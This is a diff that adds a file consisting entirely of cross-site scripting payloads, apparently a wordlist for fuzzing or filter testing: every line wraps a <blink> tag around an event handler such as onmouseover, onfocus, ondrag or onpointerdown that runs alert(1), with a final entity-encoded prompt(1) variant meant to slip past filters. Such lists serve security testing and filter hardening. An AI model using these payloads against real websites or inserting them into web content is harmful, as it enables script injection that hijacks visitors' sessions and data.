@@ -1,0 +1,44 @@
+<blink draggable="true" ondrag="alert(1)">test</blink>
+<blink draggable="true" ondragend="alert(1)">test</blink>
+<blink draggable="true" ondragenter="alert(1)">test</blink>
+<blink draggable="true" ondragleave="alert(1)">test</blink>
+<blink draggable="true" ondragstart="alert(1)">test</blink>
+<blink id=x tabindex=1 onactivate=alert(1)></blink>
+<blink id=x tabindex=1 onbeforeactivate=alert(1)></blink>
+<blink id=x tabindex=1 onbeforedeactivate=alert(1)></blink><input autofocus>
+<blink id=x tabindex=1 ondeactivate=alert(1)></blink><input id=y autofocus>
+<blink id=x tabindex=1 onfocus=alert(1)></blink>
+<blink id=x tabindex=1 onfocusin=alert(1)></blink>
+<blink onafterscriptexecute=alert(1)><script>1</script>
+<blink onbeforecopy="alert(1)" contenteditable>test</blink>
+<blink onbeforecut="alert(1)" contenteditable>test</blink>
+<blink onbeforepaste="alert(1)" contenteditable>test</blink>
+<blink onbeforescriptexecute=alert(1)><script>1</script>
+<blink onblur=alert(1) tabindex=1 id=x></blink><input autofocus>
+<blink onclick="alert(1)">test</blink>
+<blink oncontextmenu="alert(1)">test</blink>
+<blink oncopy=alert(1) value="XSS" autofocus tabindex=1>test
+<blink oncut=alert(1) value="XSS" autofocus tabindex=1>test
+<blink ondblclick="alert(1)" autofocus tabindex=1>test</blink>
+<blink onfocusout=alert(1) tabindex=1 id=x></blink><input autofocus>
+<blink onkeydown="alert(1)" contenteditable>test</blink>
+<blink onkeypress="alert(1)" contenteditable>test</blink>
+<blink onkeyup="alert(1)" contenteditable>test</blink>
+<blink onmousedown="alert(1)">test</blink>
+<blink onmouseenter="alert(1)">test</blink>
+<blink onmouseleave="alert(1)">test</blink>
+<blink onmousemove="alert(1)">test</blink>
+<blink onmouseout="alert(1)">test</blink>
+<blink onmouseover="alert(1)">test</blink>
+<blink onmouseup="alert(1)">test</blink>
+<blink onmousewheel=alert(1)>requires scrolling
+<blink onpaste="alert(1)" contenteditable>test</blink>
+<blink onpointerdown=alert(1)>XSS</blink>
+<blink onpointerenter=alert(1)>XSS</blink>
+<blink onpointerleave=alert(1)>XSS</blink>
+<blink onpointermove=alert(1)>XSS</blink>
+<blink onpointerout=alert(1)>XSS</blink>
+<blink onpointerover=alert(1)>XSS</blink>
+<blink onpointerrawupdate=alert(1)>XSS</blink>
+<blink onpointerup=alert(1)>XSS</blink>
+&#13;<blink/&#13; onmouseover=pr&#x6F;mp&#116;(1)>OnMouseOver {Firefox & Opera}
